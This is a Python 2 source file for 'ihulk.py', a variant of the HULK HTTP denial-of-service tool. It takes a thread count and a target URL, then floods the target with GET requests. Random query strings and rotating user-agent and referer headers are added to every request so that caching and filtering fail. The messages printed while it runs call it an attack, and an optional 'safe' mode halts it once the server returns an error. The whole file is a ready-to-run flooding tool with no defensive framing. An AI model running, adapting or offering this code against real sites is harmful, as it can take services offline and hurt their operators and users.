import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=[]
headers_referers=[]
request_counter=0
flag=0
safe=0

def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1

def read_useragent_list(filename):
	global headers_useragents
	file = open(filename)
	while 1:
		line = file.readline()
		headers_useragents.append(line)
		if not line:
			break
	file.close()
	return(headers_useragents)

def read_referer_list(filename):
	global headers_referers
	file = open(filename)
	while 1:
		line = file.readline()
		headers_referers.append(line)
		if not line:
			break
	file.close()
	headers_referers.append('http://' + host + '/')
	return(headers_referers)

	
#builds random ascii string
def buildblock(size):
	out_str = ''
	for i in range(0, size):
		a = random.randint(65, 90)
		out_str += chr(a)
	return(out_str)

def usage():
	print '---------------------------------------------------'
	print 'USAGE: python ihulk.py [threads] <url>'
	print 'you can add "safe" after url, to autoshut after dos'
	print '---------------------------------------------------'

	
#http request
def httpcall(url):
	code=0
	if url.count("?")>0:
		param_joiner="&"
	else:
		param_joiner="?"
	request = urllib2.Request(url + param_joiner + buildblock(random.randint(5,20)) + '=' + buildblock(random.randint(5,20)))
	request.add_header('Accept-Language', 'zh-CN')
	request.add_header('User-Agent', random.choice(headers_useragents))
	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,100)))
	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
	request.add_header('Cache-Control', 'no-cache')
	request.add_header('Keep-Alive', random.randint(110,120))
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
			print 'Response Code 500'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Requests Sent" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n-- DAN Attack Finished --"

#execute 
if len(sys.argv) < 3:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "-- DAN Attack Started --"
		if len(sys.argv)== 4:
			if sys.argv[3]=="safe":
				set_safe()
		countofthread = sys.argv[1]
		url = sys.argv[2]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		
		read_useragent_list('useragent.list')
		read_referer_list('referer.list')

		for i in range(int(countofthread)):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
